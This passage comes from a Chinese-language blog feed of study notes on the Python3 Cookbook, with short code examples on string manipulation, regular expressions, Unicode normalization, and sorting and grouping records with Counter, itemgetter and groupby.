&#39;hello&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;t.strip(&#39;-&#x3D;&#39;)  # &#39;hello&#39;</code></pre></div><h4 id="2-12-审查清理文本字符串"><a href="#2-12-审查清理文本字符串" class="headerlink" title="2.12 审查清理文本字符串"></a>2.12 审查清理文本字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 审查清理文本字符串&quot;&quot;&quot; 除了使用str.upper() 和 str.lower()变换大小写格式。str.replace() 或者 re.sub() 可以进行简单的替换操作。还可以使用 str.translate() 方法，即自己创造映射之后进行替换。&quot;&quot;&quot;s &#x3D; &#39;pýtĥöñ\fis\tawesome\r\n&#39;  # &#39;pýtĥöñ\x0cis\tawesome\r\n&#39;# 映射remap &#x3D; &#123;ord(&#39;\t&#39;): &#39; &#39;, ord(&#39;\f&#39;): &#39; &#39;, ord(&#39;\r&#39;): None&#125;# 替换a &#x3D; s.translate(remap)  # &#39;pýtĥöñ is awesome\n&#39;</code></pre></div><h4 id="2-13-字符串对齐"><a href="#2-13-字符串对齐" class="headerlink" title="2.13 字符串对齐"></a>2.13 字符串对齐</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串对齐&quot;&quot;&quot; 对于基本的字符串对齐操作，可以使用字符串的 ljust() , rjust() 和 center() 方法。所有这些方法都能接受一个可选的填充字符。&quot;&quot;&quot;text &#x3D; &#39;Hello World&#39;text.ljust(20)  # &#39;Hello World         &#39;text.rjust(20)  # &#39;         Hello World&#39;text.center(20)  # &#39;    Hello World     &#39;# 有填充字符text.rjust(20, &#39;&#x3D;&#39;)  # &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hello World&#39;text.center(20, &#39;*&#39;)  # &#39;****Hello World*****&#39;&quot;&quot;&quot; 函数 format() 同样可以用来很容易的对齐字符串。 你要做的就是使用 &lt;,&gt; 或者 ^ 字符后面紧跟一个指定的宽度。&quot;&quot;&quot;format(text, &#39;&gt;20&#39;)  # &#39;         Hello World&#39;format(text, &#39;&lt;20&#39;)  # &#39;Hello World         &#39;format(text, &#39;^20&#39;)  # &#39;    Hello World     &#39;&#39;&#123;:&gt;10s&#125; &#123;:&gt;10s&#125;&#39;.format(&#39;Hello&#39;, &#39;World&#39;)  # &#39;     Hello      World&#39;# 有填充字符format(text, &#39;&#x3D;&gt;20s&#39;)  # &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hello World&#39;format(text, &#39;*^20s&#39;)  # &#39;****Hello World*****&#39;</code></pre></div><h4 id="2-14-合并拼接字符串"><a href="#2-14-合并拼接字符串" class="headerlink" title="2.14 合并拼接字符串"></a>2.14 合并拼接字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 合并拼接字符串&quot;&quot;&quot; 如果字符串在一个list里或者iterable中，使用join()&quot;&quot;&quot;parts &#x3D; [&#39;Is&#39;, &#39;Chicago&#39;, &#39;Not&#39;, &#39;Chicago?&#39;]&#39; &#39;.join(parts)  # &#39;Is Chicago Not Chicago?&#39;&#39;,&#39;.join(parts)  # &#39;Is,Chicago,Not,Chicago?&#39;&#39;&#39;.join(parts)  # &#39;IsChicagoNotChicago?&#39;# 永远都不应该如下写s &#x3D; &#39;&#39;for p in parts:    s +&#x3D; p# 适当的时候可以使用生成器表达式&#39;,&#39;.join(str(d) for d in data)# 输出的时候没必要将字符串连接print(a, b, c, sep&#x3D;&#39;:&#39;)  # Better</code></pre></div><h4 id="2-15-字符串中插入变量"><a href="#2-15-字符串中插入变量" class="headerlink" title="2.15 字符串中插入变量"></a>2.15 字符串中插入变量</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串中插入变量&quot;&quot;&quot; 可以通过字符串的format()方法来解决。&quot;&quot;&quot;s &#x3D; &#39;&#123;name&#125; has &#123;n&#125; messages.&#39;s.format(name&#x3D;&#39;Guido&#39;, n&#x3D;37)  # &#39;Guido has 37 messages.&#39;&quot;&quot;&quot; 如果要被替换的变量能在变量域中找到， 那么你可以结合使用 format_map() 和 vars()。&quot;&quot;&quot;name &#x3D; &#39;Guido&#39;n &#x3D; 37s.format_map(vars())  # &#39;Guido has 37 messages.&#39;</code></pre></div><h4 id="2-16-以指定列宽格式化字符"><a href="#2-16-以指定列宽格式化字符" class="headerlink" title="2.16 以指定列宽格式化字符"></a>2.16 以指定列宽格式化字符</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 以指定列宽格式化字符&quot;&quot;&quot; 使用 textwrap 模块来格式化字符串的输出&quot;&quot;&quot;import osimport textwraps &#x3D; &quot;Look into my eyes, look into my eyes, the eyes, the eyes, \the eyes, not around the eyes, don&#39;t look around the eyes, \look into my eyes, you&#39;re under.&quot;# 输出以多少字符换行print(textwrap.fill(s, 70))print(textwrap.fill(s, 40))# 首行缩进print(textwrap.fill(s, 40, initial_indent&#x3D;&#39;    &#39;))# 次行及之后缩进print(textwrap.fill(s, 40, subsequent_indent&#x3D;&#39;    &#39;))# 获取终端大小尺寸os.get_terminal_size().columns</code></pre></div><h4 id="2-17-在字符串中处理html和xml"><a href="#2-17-在字符串中处理html和xml" class="headerlink" title="2.17 在字符串中处理html和xml"></a>2.17 在字符串中处理html和xml</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 在字符串中处理html和xml&quot;&quot;&quot; 使用html模块中的函数&quot;&quot;&quot;import htmls &#x3D; &#39;Elements are written as &quot;&lt;tag&gt;text&lt;&#x2F;tag&gt;&quot;.&#39;# 替换字符串中的尖括号print(html.escape(s))# Elements are written as &quot;&lt;tag&gt;text&lt;&#x2F;tag&gt;&quot;.# 将非ASCII文本对应的编码实体嵌入进去s &#x3D; &#39;Spicy Jalapeño&#39;s.encode(&#39;ascii&#39;, errors&#x3D;&#39;xmlcharrefreplace&#39;)# b&#39;Spicy Jalape&amp;#241;o&#39;# 使用HTML或者XML解析器的一些相关工具函数&#x2F;方法s &#x3D; &#39;Spicy &quot;Jalape&amp;#241;o&amp;quot.&#39;from html.parser import HTMLParserp &#x3D; HTMLParser()p.unescape(s)# &#39;Spicy &quot;Jalapeño&quot;.&#39;t &#x3D; &#39;The prompt is &gt;&gt;&gt;&#39;from xml.sax.saxutils import unescapeunescape(t)# &#39;The prompt is &gt;&gt;&gt;&#39;</code></pre></div><h4 id="2-18-字符串令牌解析"><a href="#2-18-字符串令牌解析" class="headerlink" title="2.18 字符串令牌解析"></a>2.18 字符串令牌解析</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串令牌解析&quot;&quot;&quot;  模式对象scanner() 方法。 这个方法会创建一个 scanner 对象， 在这个对象上不断的调用 match() 方法会一步步的扫描目标文本，每步一个匹配。&quot;&quot;&quot;# 想将t转换为tokensimport ret &#x3D; &#39;foo &#x3D; 23 + 42 * 10&#39;tokens &#x3D; [(&#39;NAME&#39;, &#39;foo&#39;), (&#39;EQ&#39;, &#39;&#x3D;&#39;), (&#39;NUM&#39;, &#39;23&#39;), (&#39;PLUS&#39;, &#39;+&#39;),          (&#39;NUM&#39;, &#39;42&#39;), (&#39;TIMES&#39;, &#39;*&#39;), (&#39;NUM&#39;, &#39;10&#39;)]NAME &#x3D; r&#39;(?P&lt;NAME&gt;[a-zA-Z_][a-zA-Z_0-9]*)&#39;NUM &#x3D; r&#39;(?P&lt;NUM&gt;\d+)&#39;PLUS &#x3D; r&#39;(?P&lt;PLUS&gt;\+)&#39;TIMES &#x3D; r&#39;(?P&lt;TIMES&gt;\*)&#39;EQ &#x3D; r&#39;(?P&lt;EQ&gt;&#x3D;)&#39;WS &#x3D; r&#39;(?P&lt;WS&gt;\s+)&#39;master_pat &#x3D; re.compile(&#39;|&#39;.join([NAME, NUM, PLUS, TIMES, EQ, WS]))scanner &#x3D; master_pat.scanner(&#39;foo &#x3D; 42&#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;NAME&#39;, &#39;foo&#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;WS&#39;, &#39; &#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;EQ&#39;, &#39;&#x3D;&#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;WS&#39;, &#39; &#39;)scanner.match()# &lt;_sre.SRE_Match object at 0x100677738&gt;_.lastgroup, _.group()# (&#39;NUM&#39;, &#39;42&#39;)scanner.match()</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Cookbook</tag>
      
      <tag>字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第二章:字符串和文本(1)</title>
    <link href="/posts/f1c5e49e/"/>
    <url>/posts/f1c5e49e/</url>
    
    <content type="html"><![CDATA[<h4 id="2-1-使用多个界定符分割字符串"><a href="#2-1-使用多个界定符分割字符串" class="headerlink" title="2.1 使用多个界定符分割字符串"></a>2.1 使用多个界定符分割字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 使用多个界定符分割字符串&quot;&quot;&quot; string 对象的 split() 方法只适应于非常简单的字符串分割情形。re.split() 方法可以更加灵活的切割字符串。&quot;&quot;&quot;import reline &#x3D; &#39;asdf fjdk; afed, fjek,asdf, foo&#39;# 表示可以通过;或,或空格或多个空格分隔re.split(r&#39;[;,\s]\s*&#39;, line)# Outputs# [&#39;asdf&#39;, &#39;fjdk&#39;, &#39;afed&#39;, &#39;fjek&#39;, &#39;asdf&#39;, &#39;foo&#39;]</code></pre></div><h4 id="2-2-字符串开头或结尾匹配"><a href="#2-2-字符串开头或结尾匹配" class="headerlink" title="2.2 字符串开头或结尾匹配"></a>2.2 字符串开头或结尾匹配</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串开头或结尾匹配&quot;&quot;&quot; 简单使用可以通过str.startswith() 或者是 str.endswith() 方法。如果需要多种匹配可以将匹配项作为元组（且必须是元组tuple()）传入上述方法。切片实现不优雅，正则实现较复杂，这种方式简单使用较方便。&quot;&quot;&quot;filename &#x3D; &#39;spam.txt&#39;filename.endswith(&#39;.txt&#39;)  # Truefilename.startswith(&#39;file:&#39;)  # Falseurl &#x3D; &#39;http:&#x2F;&#x2F;www.python.org&#39;url.startswith(&#39;http:&#39;)  # True[name for name in filenames if name.endswith((&#39;.c&#39;, &#39;.h&#39;))]</code></pre></div><h4 id="2-3-用Shell通配符匹配字符串"><a href="#2-3-用Shell通配符匹配字符串" class="headerlink" title="2.3 用Shell通配符匹配字符串"></a>2.3 用Shell通配符匹配字符串</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 用Shell通配符匹配字符串&quot;&quot;&quot; fnmatch 模块提供了两个函数—— fnmatch() 和 fnmatchcase() ，可以用来实现这样的匹配。fnmatch()大小写敏感根据系统不同而不尽相同。fnmatchcase()大小写敏感。功能强度介于字符串与正则之间。&quot;&quot;&quot;from fnmatch import fnmatch, fnmatchcasefnmatch(&#39;foo.txt&#39;, &#39;*.txt&#39;)  # Truefnmatch(&#39;foo.txt&#39;, &#39;?oo.txt&#39;)  # Truefnmatch(&#39;Dat45.csv&#39;, &#39;Dat[0-9]*&#39;)  # True</code></pre></div><h4 id="2-4-字符串匹配和搜索"><a href="#2-4-字符串匹配和搜索" class="headerlink" title="2.4 字符串匹配和搜索"></a>2.4 字符串匹配和搜索</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串匹配和搜索&quot;&quot;&quot; str.find() , str.endswith() , str.startswith() 或者类似的方法可做简单匹配。复杂匹配可以使用re模块与正则表达式。表达式多次使用可以预编译为模式对象。&quot;&quot;&quot;import retext1 &#x3D; &#39;11&#x2F;27&#x2F;2012&#39;text2 &#x3D; &#39;Nov 27, 2012&#39;if re.match(r&#39;\d+&#x2F;\d+&#x2F;\d+&#39;, text1):    print(&#39;yes&#39;)else:    print(&#39;no&#39;)if re.match(r&#39;\d+&#x2F;\d+&#x2F;\d+&#39;, text2):    print(&#39;yes&#39;)else:    print(&#39;no&#39;)# 预编译为模式对象# 字符串前的r表示字符串为raw string，即不会转义。如果此处没有r需要双反斜杠阅读性差。datepat &#x3D; re.compile(r&#39;\d+&#x2F;\d+&#x2F;\d+&#39;)if datepat.match(text1):    print(&#39;yes&#39;)else:    print(&#39;no&#39;)&quot;&quot;&quot; match() 总是从字符串开始去匹配，如果你想查找字符串任意部分的模式出现位置， 使用 findall() 方法去代替。如果你想以迭代方式返回匹配，可以使用 finditer() 方法来代替。&quot;&quot;&quot;text &#x3D; &#39;Today is 11&#x2F;27&#x2F;2012. PyCon starts 3&#x2F;13&#x2F;2013.&#39;datepat.findall(text)# Outputs# [&#39;11&#x2F;27&#x2F;2012&#39;, &#39;3&#x2F;13&#x2F;2013&#39;]&quot;&quot;&quot; 使用括号去捕获分组，分别将每个组的内容提取出来。&quot;&quot;&quot;datepat &#x3D; re.compile(r&#39;(\d+)&#x2F;(\d+)&#x2F;(\d+)&#39;)m &#x3D; datepat.match(&#39;11&#x2F;27&#x2F;2012&#39;)# &lt;_sre.SRE_Match object at 0x1005d2750&gt;m.group(0)  # &#39;11&#x2F;27&#x2F;2012&#39;m.group(1)  # &#39;11&#39;m.group(2)  # &#39;27&#39;m.group(3)  # &#39;2012&#39;m.groups()  # (&#39;11&#39;, &#39;27&#39;, &#39;2012&#39;)# Find all matches (notice splitting into tuples)text &#x3D; &#39;Today is 11&#x2F;27&#x2F;2012. PyCon starts 3&#x2F;13&#x2F;2013.&#39;datepat.findall(text)[(&#39;11&#39;, &#39;27&#39;, &#39;2012&#39;), (&#39;3&#39;, &#39;13&#39;, &#39;2013&#39;)]for month, day, year in datepat.findall(text):    print(&#39;&#123;&#125;-&#123;&#125;-&#123;&#125;&#39;.format(year, month, day))</code></pre></div><h4 id="2-5-字符串搜索和替换"><a href="#2-5-字符串搜索和替换" class="headerlink" title="2.5 字符串搜索和替换"></a>2.5 字符串搜索和替换</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串搜索和替换&quot;&quot;&quot; 简单字面模式可以使用str.replace()。对于复杂的模式，请使用 re 模块中的 sub() 函数。&quot;&quot;&quot;# str.replace()import retext &#x3D; &#39;yeah, but no, but yeah, but no, but yeah&#39;text.replace(&#39;yeah&#39;, &#39;yep&#39;)# &#39;yep, but no, but yep, but no, but yep&#39;# re.sub()text &#x3D; &#39;Today is 11&#x2F;27&#x2F;2012. PyCon starts 3&#x2F;13&#x2F;2013.&#39;re.sub(r&#39;(\d+)&#x2F;(\d+)&#x2F;(\d+)&#39;, r&#39;\3-\1-\2&#39;, text)# &#39;Today is 2012-11-27. PyCon starts 2013-3-13.&#39;# sub() 函数中的第一个参数是被匹配的模式，第二个参数是替换模式。反斜杠数字比如 \3 指向前面模式的捕获组号。# 预编译datepat &#x3D; re.compile(r&#39;(\d+)&#x2F;(\d+)&#x2F;(\d+)&#39;)datepat.sub(r&#39;\3-\1-\2&#39;, text)</code></pre></div><h4 id="2-6-字符串忽略大小写的搜索替换"><a href="#2-6-字符串忽略大小写的搜索替换" class="headerlink" title="2.6 字符串忽略大小写的搜索替换"></a>2.6 字符串忽略大小写的搜索替换</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字符串忽略大小写的搜索替换&quot;&quot;&quot; 为了在文本操作时忽略大小写，你需要在使用 re 模块的时候给这些操作提供 re.IGNORECASE 标志参数。&quot;&quot;&quot;import retext &#x3D; &#39;UPPER PYTHON, lower python, Mixed Python&#39;re.findall(&#39;python&#39;, text, flags&#x3D;re.IGNORECASE)# [&#39;PYTHON&#39;, &#39;python&#39;, &#39;Python&#39;]re.sub(&#39;python&#39;, &#39;snake&#39;, text, flags&#x3D;re.IGNORECASE)# &#39;UPPER snake, lower snake, Mixed snake&#39;</code></pre></div><h4 id="2-7-最短模式匹配"><a href="#2-7-最短模式匹配" class="headerlink" title="2.7 最短模式匹配"></a>2.7 最短模式匹配</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 最短模式匹配&quot;&quot;&quot; 通过正则表达式的限定符?改变匹配的模式为最短匹配。&quot;(.*)&quot;表示最长匹配双引号内的内容。&quot;(.*?)&quot;表示最短匹配双引号内的内容。&quot;&quot;&quot;import restr_pat &#x3D; re.compile(r&#39;&quot;(.*)&quot;&#39;)text1 &#x3D; &#39;Computer says &quot;no.&quot;&#39;str_pat.findall(text1)# [&#39;no.&#39;]text2 &#x3D; &#39;Computer says &quot;no.&quot; Phone says &quot;yes.&quot;&#39;str_pat.findall(text2)# [&#39;no.&quot; Phone says &quot;yes.&#39;]str_pat &#x3D; re.compile(r&#39;&quot;(.*?)&quot;&#39;)str_pat.findall(text2)# [&#39;no.&#39;, &#39;yes.&#39;]</code></pre></div><h4 id="2-8-多行匹配模式"><a href="#2-8-多行匹配模式" class="headerlink" title="2.8 多行匹配模式"></a>2.8 多行匹配模式</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 多行匹配模式&quot;&quot;&quot; 当你用点(.)去匹配任意字符的时候，发现点(.)不能匹配换行符的事实。其中一种场景就是匹配C语言的跨行注释。&quot;&quot;&quot;import re# 该模式对象只能匹配未换行的注释comment &#x3D; re.compile(r&#39;&#x2F;\*(.*?)\*&#x2F;&#39;)# 修改模式增加对换行的支持# (?:.|*?)中，?:表示匹配但不获取(非捕获组)，|表示或关系，*？表示任意数量但最短匹配comment &#x3D; re.compile(r&#39;&#x2F;\*((?:.|\n)*?)\*&#x2F;&#39;)</code></pre></div><h4 id="2-9-将Unicode文本标准化"><a href="#2-9-将Unicode文本标准化" class="headerlink" title="2.9 将Unicode文本标准化"></a>2.9 将Unicode文本标准化</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 将Unicode文本标准化&quot;&quot;&quot; 使用unicodedata模块将文本标准化&quot;&quot;&quot;import unicodedatas1 &#x3D; &#39;Spicy Jalape\u00f1o&#39;  # &#39;Spicy Jalapeño&#39;s2 &#x3D; &#39;Spicy Jalapen\u0303o&#39;  # &#39;Spicy Jalapeño&#39;s1 &#x3D;&#x3D; s2  # Falset1 &#x3D; unicodedata.normalize(&#39;NFC&#39;, s1)t2 &#x3D; unicodedata.normalize(&#39;NFC&#39;, s2)t1 &#x3D;&#x3D; t2  # True</code></pre></div><hr><blockquote><p>参考：</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Cookbook</tag>
      
      <tag>字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第一章:数据结构和算法(2)</title>
    <link href="/posts/d590dae/"/>
    <url>/posts/d590dae/</url>
    
    <content type="html"><![CDATA[<h4 id="1-11-命名切片"><a href="#1-11-命名切片" class="headerlink" title="1.11 命名切片"></a>1.11 命名切片</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 命名切片# 假定你要从一个记录（比如文件或其他类似格式）中的某些固定位置提取字段# 与其record &#x3D; &#39;....................100 .......513.25 ..........&#39;cost &#x3D; int(record[20:23]) * float(record[31:37])# 不如SHARES &#x3D; slice(20, 23)PRICE &#x3D; slice(31, 37)cost &#x3D; int(record[SHARES]) * float(record[PRICE])</code></pre></div><h4 id="1-12-序列中出现次数最多的元素"><a href="#1-12-序列中出现次数最多的元素" class="headerlink" title="1.12 序列中出现次数最多的元素"></a>1.12 序列中出现次数最多的元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 序列中出现次数最多的元素&quot;&quot;&quot; collections.Counter 类就是专门为这类问题而设计的， 它甚至有一个有用的 most_common() 方法直接给了你答案。&quot;&quot;&quot;# 取出出现频率最高的单词from collections import Counterwords &#x3D; [    &#39;look&#39;, &#39;into&#39;, &#39;my&#39;, &#39;eyes&#39;, &#39;look&#39;, &#39;into&#39;, &#39;my&#39;, &#39;eyes&#39;,    &#39;the&#39;, &#39;eyes&#39;, &#39;the&#39;, &#39;eyes&#39;, &#39;the&#39;, &#39;eyes&#39;, &#39;not&#39;, &#39;around&#39;, &#39;the&#39;,    &#39;eyes&#39;, &quot;don&#39;t&quot;, &#39;look&#39;, &#39;around&#39;, &#39;the&#39;, &#39;eyes&#39;, &#39;look&#39;, &#39;into&#39;,    &#39;my&#39;, &#39;eyes&#39;, &quot;you&#39;re&quot;, &#39;under&#39;]word_counts &#x3D; Counter(words)# 出现频率最高的3个单词top_three &#x3D; word_counts.most_common(3)print(top_three)# Outputs [(&#39;eyes&#39;, 8), (&#39;the&#39;, 5), (&#39;look&#39;, 4)]&quot;&quot;&quot; collections.Counter底层实际上是一个元素作为key，出现次数作为value的dict。神奇的是还能进行数学运算操作结合。&quot;&quot;&quot;morewords &#x3D; [&#39;why&#39;,&#39;are&#39;,&#39;you&#39;,&#39;not&#39;,&#39;looking&#39;,&#39;in&#39;,&#39;my&#39;,&#39;eyes&#39;]a &#x3D; Counter(words)b &#x3D; Counter(morewords)a# Outputs# Counter(&#123;&#39;eyes&#39;: 8, &#39;the&#39;: 5, &#39;look&#39;: 4, &#39;into&#39;: 3, &#39;my&#39;: 3, &#39;around&#39;: 2,&quot;you&#39;re&quot;: 1, &quot;don&#39;t&quot;: 1, &#39;under&#39;: 1, &#39;not&#39;: 1&#125;)b# Outputs# Counter(&#123;&#39;eyes&#39;: 1, &#39;looking&#39;: 1, &#39;are&#39;: 1, &#39;in&#39;: 1, &#39;not&#39;: 1, &#39;you&#39;: 1,&#39;my&#39;: 1, &#39;why&#39;: 1&#125;)# Combine countsc &#x3D; a + bc# Outputs# Counter(&#123;&#39;eyes&#39;: 9, &#39;the&#39;: 5, &#39;look&#39;: 4, &#39;my&#39;: 4, &#39;into&#39;: 3, &#39;not&#39;: 2,&#39;around&#39;: 2, &quot;you&#39;re&quot;: 1, &quot;don&#39;t&quot;: 1, &#39;in&#39;: 1, &#39;why&#39;: 1,&#39;looking&#39;: 1, &#39;are&#39;: 1, &#39;under&#39;: 1,&#39;you&#39;: 1&#125;)# Subtract countsd &#x3D; a - bd# Outputs# Counter(&#123;&#39;eyes&#39;: 7, &#39;the&#39;: 5, &#39;look&#39;: 4, &#39;into&#39;: 3, &#39;my&#39;: 2, &#39;around&#39;: 2,&quot;you&#39;re&quot;: 1, &quot;don&#39;t&quot;: 1, &#39;under&#39;: 1&#125;)</code></pre></div><h4 id="1-13-通过某个关键字排序一个字典列表"><a href="#1-13-通过某个关键字排序一个字典列表" class="headerlink" title="1.13 通过某个关键字排序一个字典列表"></a>1.13 通过某个关键字排序一个字典列表</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 通过某个关键字排序一个字典列表&quot;&quot;&quot; 使用 operator 模块的 itemgetter 函数。排序过程中，相当于key使用的itemgetter获取到了dict中对应key的value进行排序。itemgetter同时支持多个keys。&quot;&quot;&quot;from operator import itemgetterrows &#x3D; [    &#123;&#39;fname&#39;: &#39;Brian&#39;, &#39;lname&#39;: &#39;Jones&#39;, &#39;uid&#39;: 1003&#125;,    &#123;&#39;fname&#39;: &#39;David&#39;, &#39;lname&#39;: &#39;Beazley&#39;, &#39;uid&#39;: 1002&#125;,    &#123;&#39;fname&#39;: &#39;John&#39;, &#39;lname&#39;: &#39;Cleese&#39;, &#39;uid&#39;: 1001&#125;,    &#123;&#39;fname&#39;: &#39;Big&#39;, &#39;lname&#39;: &#39;Jones&#39;, &#39;uid&#39;: 1004&#125;]rows_by_fname &#x3D; sorted(rows, key&#x3D;itemgetter(&#39;fname&#39;))rows_by_uid &#x3D; sorted(rows, key&#x3D;itemgetter(&#39;uid&#39;))print(rows_by_fname)print(rows_by_uid)rows_by_lfname &#x3D; sorted(rows, key&#x3D;itemgetter(&#39;lname&#39;, &#39;fname&#39;))print(rows_by_lfname)&quot;&quot;&quot; 在上面例子中， rows 被传递给接受一个关键字参数的 sorted() 内置函数。 这个参数是 callable 类型，并且从 rows 中接受一个单一元素，然后返回被用来排序的值。itemgetter() 函数就是负责创建这个 callable 对象的。本例中的操作基本等同于key中使用lambda定义，但是效率更高。同样适用于max，min等。&quot;&quot;&quot;rows_by_fname &#x3D; sorted(rows, key&#x3D;lambda r: r[&#39;fname&#39;])rows_by_lfname &#x3D; sorted(rows, key&#x3D;lambda r: (r[&#39;lname&#39;], r[&#39;fname&#39;]))</code></pre></div><h4 id="1-14-排序不支持原生比较的对象"><a href="#1-14-排序不支持原生比较的对象" class="headerlink" title="1.14 排序不支持原生比较的对象"></a>1.14 排序不支持原生比较的对象</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 排序不支持原生比较的对象&quot;&quot;&quot; 关键在于传入callable的key参数时，获取到非原生对象的具体变量。可以通过lambda或者operator中的attrgetter。&quot;&quot;&quot;from operator import attrgetterclass User:    def __init__(self, user_id):        self.user_id &#x3D; user_id    def __repr__(self):        return &#39;User(&#123;&#125;)&#39;.format(self.user_id)users &#x3D; [User(23), User(3), User(99)]# Method 1print(sorted(users, key&#x3D;lambda u: u.user_id))# Method 2print(sorted(users, key&#x3D;attrgetter(&#39;user_id&#39;)))</code></pre></div><h4 id="1-15-通过某个字段将记录分组"><a href="#1-15-通过某个字段将记录分组" class="headerlink" title="1.15 通过某个字段将记录分组"></a>1.15 通过某个字段将记录分组</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 通过某个字段将记录分组&quot;&quot;&quot; 使用itertools.groupby()函数，务必记得需要先排序&quot;&quot;&quot;from collections import defaultdictfrom itertools import groupbyfrom operator import itemgetterrows &#x3D; [    &#123;&#39;address&#39;: &#39;5412 N CLARK&#39;, &#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;5148 N CLARK&#39;, &#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;5800 E 58TH&#39;, &#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;2122 N CLARK&#39;, &#39;date&#39;: &#39;07&#x2F;03&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;5645 N RAVENSWOOD&#39;, &#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;1060 W ADDISON&#39;, &#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;4801 N BROADWAY&#39;, &#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;&#125;,    &#123;&#39;address&#39;: &#39;1039 W GRANVILLE&#39;, &#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;&#125;,]# 需要预先按照想要分组的item排序rows.sort(key&#x3D;itemgetter(&#39;date&#39;))# 分组for date, items in groupby(rows, key&#x3D;itemgetter(&#39;date&#39;)):    print(date)    for i in items:        print(&#39; &#39;, i)&quot;&quot;&quot; 输出结果07&#x2F;01&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;, &#39;address&#39;: &#39;5412 N CLARK&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;01&#x2F;2012&#39;, &#39;address&#39;: &#39;4801 N BROADWAY&#39;&#125;07&#x2F;02&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;, &#39;address&#39;: &#39;5800 E 58TH&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;, &#39;address&#39;: &#39;5645 N RAVENSWOOD&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;02&#x2F;2012&#39;, &#39;address&#39;: &#39;1060 W ADDISON&#39;&#125;07&#x2F;03&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;03&#x2F;2012&#39;, &#39;address&#39;: &#39;2122 N CLARK&#39;&#125;07&#x2F;04&#x2F;2012  &#123;&#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;, &#39;address&#39;: &#39;5148 N CLARK&#39;&#125;  &#123;&#39;date&#39;: &#39;07&#x2F;04&#x2F;2012&#39;, &#39;address&#39;: &#39;1039 W GRANVILLE&#39;&#125;&quot;&quot;&quot;&quot;&quot;&quot; 如果需要保持序列顺序，则可以通过1-6中的defaultdict，将想要分组的item作为其中的key，然后将整条记录append到对应item的组别中。&quot;&quot;&quot;rows_by_date &#x3D; defaultdict(list)for row in rows:    rows_by_date[row[&#39;date&#39;]].append(row)</code></pre></div><h4 id="1-16-过滤序列元素"><a 